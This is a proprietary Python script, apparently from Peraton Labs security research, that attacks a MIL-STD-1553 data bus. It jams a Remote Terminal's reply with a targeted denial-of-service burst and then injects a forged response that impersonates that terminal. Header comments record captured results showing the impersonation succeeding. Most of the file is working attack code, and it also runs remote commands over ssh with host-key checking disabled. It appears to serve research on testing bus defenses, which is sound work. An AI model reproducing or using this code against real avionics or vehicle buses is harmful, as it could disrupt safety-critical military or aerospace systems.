#!/usr/bin/python3
#
# ++Copyright Peraton LABS GPR++
#
# Copyright (c) 2020 Peraton Labs
# All rights reserved.
#
# This Software contains proprietary information of Peraton Labs that
# shall be distributed, routed or made available solely to authorized
# persons having a need to know within Peraton Labs and the US
# Government, except with the written permission of Peraton Labs.
#
# - -Copyright Peraton LABS GPR- -
#
# Online impersonation -- become RT 1 while RT 1 is still responding
#
# 6a out=5: 4.4V P2P
# 6a out=1: 2V P2P
# 6a out=4: 2V P2P
# 6b out=5: 2V P2P
# 6b out=1: 0V P2P
# 6b out=4: 2V P2P
#
# Impersonated output: (train impers)
#   GT:60/0 RT1:20=/0 RT2:20=/0 RT3:20=/0  ERRORS=0 RTMISSING=0 BCMISSING=0
#   215:17:50:39.962390 Ch-0 B 01 T 01 00 ?? ? ?? ?? 0800 06250 ???? ????? None None feed face dead beef 8bad f00d baaa aaad baad f00d badd cafe b000 dead dead baad dead 2bad dead c0de dead d00d dead fa11 dead feed deca fbad face feed feed c0de
#   Looks like it worked because the impers was first and louder?
#
# Zapped output: (zap only)
#   GT:55/11 RT1:11=/0 RT2:22=/0 RT3:22=/0  ERRORS=11 RTMISSING=0 BCMISSING=0
#   215:17:48:42.449562 Ch-0 B 01 T 01 00 ?? ? ?? ?? ???? ????? ???? ????? Term_No_Response:Low_Word_Count None
#
# Online impersonated output: (zap + train impers -- next RT gets confused and misses xfer even though not mollested)
#   GT:50/10 RT1:11=/10 RT2:10=/0 RT3:20=/0  ERRORS=20 RTMISSING=9 BCMISSING=0
#   215:17:44:08.032670 Ch-0 B 01 T 01 00 ?? ? ?? ?? 0800 06250 ???? ????? None None feed face dead beef 8bad f00d baaa aaad baad f00d badd cafe b000 dead dead baad dead 2bad dead c0de dead d00d dead fa11 dead feed deca fbad face feed feed c0de
#   215:18:16:34.808136 Ch-0 B 02 R 01 31 ?? ? ?? ?? ???? ????? ???? ????? None Term_No_Response ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff


import argparse
import subprocess
import shlex
import sys
from bd_1553gen import *

def auto_int(x):
    return int(x, 0)


parser = argparse.ArgumentParser()
parser.add_argument('--verbose', action='count', help='Increasing levels of verbosity')
parser.add_argument('--outlines', default=0x5, type=auto_int, help='Lines to transmit on bitfield')
parser.add_argument('--inlines', default=0x5, type=auto_int, help='Lines to listen on bitfield')
parser.add_argument('--onceonly', action='store_true', help='Send only one frame')
parser.add_argument('--host', default=None, help='Host to auto-execute program on (empty-string performs direct execution)')
parser.add_argument('--hostwait', action='store_true', help='Prompt for continuation before poke')
parser.add_argument('-a','--logtest_arg', default=[], action='append', help='Specify (repeated arguments) logtest arguments')
parser.add_argument('--secure', action='store_true', help='Run wavegen on a BD that uses /secure')
parser.add_argument('--reset', action='store_true', help='Stop wavegen execution')
args = parser.parse_args()


def genbdconfig(inports,xfers=[],addressmap=[],outports=[30]):
    """Generate reactive bus defender configuration"""

    config = "*INIT,\n"
    for p in inports:
        config += "*INPORT, %d\n"%p
    for p in outports:
        config += "*OUTPORT, %d\n"%p
    config += "*NOSPEAKER_CONTROL\n"
    config += "*PORTMAP, 30, BM\n"

    rtlist = {"BC":1}
    for name, xfer in xfers:
        if xfer.rtaddr1 is not None:
            rtlist[xfer.rtaddr1] = 1
        if xfer.rtaddr2 is not None:
            rtlist[xfer.rtaddr2] = 1
    for rt in rtlist:
        for p in inports:
            config += "*PORTMAP, %d, %s\n"%(p, rt)

    if xfers and addressmap:
        config += "*HASH_ACTION, WAVEGEN_GOTO\n"
    for name, xfer in xfers:
        config += "# %s\n"%name
        config += "\n".join(xfer.bdrule(aux=addressmap[name], ports=inports)) + "\n"

    return config


inports = []
for port in range(32):
    if ((1 << port) & args.inlines):
        inports.append(port)


p = wavegen_link(defaultlines=args.outlines)
p.addgroup("init", predelay=-1, postgoto="init")

######################################################################
# Targeting 1T1/32
#   Triggered during 1R1/32
#   Wait for BCRT1(1R1/32) to complete (+ 2ųs of idle)
cmd = [wavegen_code.wait_idlecnt(2)]
#   Wait for BCRT2(1R1/32) status (or timeout)
cmd.append(wavegen_code.wait_timed_activity(10, args.inlines))
#     Saw status (wait for status to complete + 2ųs)
cmd.append(wavegen_code.wait_idlecnt(2))
#     Timed out BCRT2() or saw status + 2ųs.  Next should be RTBC1(1T1/32)
cmd.append(wavegen_code.wait_activity(args.inlines))
#     Saw (we assume) RTBC1().  Delay past SYNC and RT
cmd.append(wavegen_code.wait_bitcnt(9))
#     Targeted DoS at 3MHz for 8.3 ųs
cmd.append(wavegen_code.txvar(1, 33, 0x155, 0x3ff))
cmd.append(wavegen_code.txcont(0, 0x5555, 0x7fff))
#     Wait for RTBC1 (we assume) to complete + 4ųs)
cmd.append(wavegen_code.wait_idlecnt(4))
#     Respond as if we were RT1
train = train_1553_RTBC_2(17, [ 0xfeed, 0xface, 0xdead, 0xbeef, 0x8bad, 0xf00d, 0xbaaa, 0xaaad, 0xbaad, 0xf00d, 0xbadd, 0xcafe, 0xb000, 0xdead, 0xdead, 0xbaad, 0xdead, 0x2bad, 0xdead, 0xc0de, 0xdead, 0xd00d, 0xdead, 0xfa11, 0xdead, 0xfeed, 0xdeca, 0xfbad, 0xface, 0xfeed, 0xfeed, 0xc0de ])
cmd += train.cmd_mcode

g="1T1/32-TARGET@1R1/32+1"
p.addgroup(g, cmds=cmd, postgoto="init")
p.link(resetonly=args.reset)
bdconfig = genbdconfig(inports, [(g, ms1553_messageinfo("BCRT1(17.1/32)"))], p.addresses)

# Generate/execute Bus Defender configuration if necessary
if args.host is not None:
    cmda = ["/secure/bin/logtest", "--secure"] if args.secure else ["/tmp/logtest", "--ringread", "/tmp/ringread", "--bit", "/tmp/hc-154.bit", "--bare", "/tmp/hcbare.elf" ] +args.logtest_arg+["--config", "-"]
    cmda = map(shlex.quote, cmda)
    if args.host == "":
        sp = subprocess.Popen(cmda, stdin=subprocess.PIPE)
    else:
        sp = subprocess.Popen(["ssh", "-oStrictHostKeyChecking=no", "-oConnectTimeout=2", args.host, *list(map(shlex.quote, cmda))], stdin=subprocess.PIPE)
    sp.communicate(input=bdconfig.encode('utf-8'))
    if sp.returncode != 0:
        raise subprocess.CalledProcessError(sp.returncode, "logtest %s"%args.host)
else:
    print(bdconfig)

if args.host and args.hostwait:
    input("Press return to program/start microcode")

# Generate/execute programs
if args.host is not None:
    p.execute(args.host, resetonly=args.reset)
else:
    p.debugpoke(resetonly=args.reset)
    p.gotomap(resetonly=args.reset)
